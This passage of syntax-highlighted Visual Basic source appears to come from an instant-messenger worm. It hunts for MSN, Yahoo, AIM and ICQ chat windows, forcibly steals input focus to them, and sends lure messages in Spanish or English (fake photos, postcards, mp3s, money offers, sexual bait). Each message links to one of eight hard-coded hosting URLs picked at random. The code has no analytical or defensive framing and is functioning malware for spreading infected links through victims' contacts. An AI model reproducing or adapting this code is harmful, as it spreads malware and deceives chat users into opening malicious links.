</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumMSG</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wnc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc7">DoEvents</span><span class="sc0">

</span><span class="sc7">wnc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">256</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetClassName</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wnc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">wnc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"imwindowclass"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SpamMsn</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"imclass"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SpamYms</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc4">"aim_imessage"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">ShowWindow</span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">EnumChildWindows</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">AddressOf</span><span class="sc0"> </span><span class="sc7">EnumChildProc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">

</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"#"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SpamIcq</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">EnumMSG</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">Randomize</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://interserv1.thefreebizhost.com"</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://www.iespana.es/interserv4"</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://interserv5.thefreebizhost.com"</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://interserv6.mysitespace.com"</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://hosting.mixcat.com/interserv7"</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://n.1asphost.com/interserv8"</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://interserv9.t35.com"</span><span class="sc0">
</span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"http://interserv10.i-networx.de"</span><span class="sc0">
</span><span class="sc7">GetWeb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gw</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SetSpam</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">LangID</span><span class="sc6">()),</span><span class="sc0"> </span><span class="sc4">"espaol"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira esta foto "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira esta pagina "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" capaz te interese"</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Te envio una postal "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Como esta mi foto "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Escucha el mp3 "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira estos iconos para el msn "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Gana dinero en internet "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mujeres a todo color, "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira este cartoon, "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Foto Ovni "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira esta foto, esta buena "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">11</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Ha recibido una postal electronica "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">12</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira esta web "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" ,Seguro te interesara"</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira mi foto "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">14</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"XXX Sex Teens Lesb "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Invitacion a iniciar Juego "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Ha recibido un email "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">17</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Gana dinero en internet "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">18</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira esta ilusion optica "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">19</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Bajate este video, esta bueno "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">20</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Mira este Cartoon "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">21</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Escucha este mp3 "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">22</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Conoce los secretos de ocultismo "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">23</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Nueva Seccion Manual de Seduccion "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">24</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Conoces como piensa el sexo opuesto? "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">25</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Solo para mayores de 18 aos "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">26</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Radio On-line "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">27</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Invitacion para recibir seal de camara web "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">28</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Cancion del Mamut tercera parte "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">29</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Participa en el sorteo y gana una super computadora "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks at this picture "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks this "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" capable it interests you"</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"A postal "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" sends you"</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"As this my picture "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"listens the mp3 "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks at these icons for the msn "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"It makes money in internet "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Women to all color, "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks at this cartoon, "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Picture Ovni "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">10</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks at this picture, this good "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">11</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"has received a postcard electronic "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">12</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks at this web "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" ,Sure it interested you"</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">13</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks at my picture "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">14</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"XXX Sex Teens Lesb "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">15</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Invitation to begin Plays "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"has received an email "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
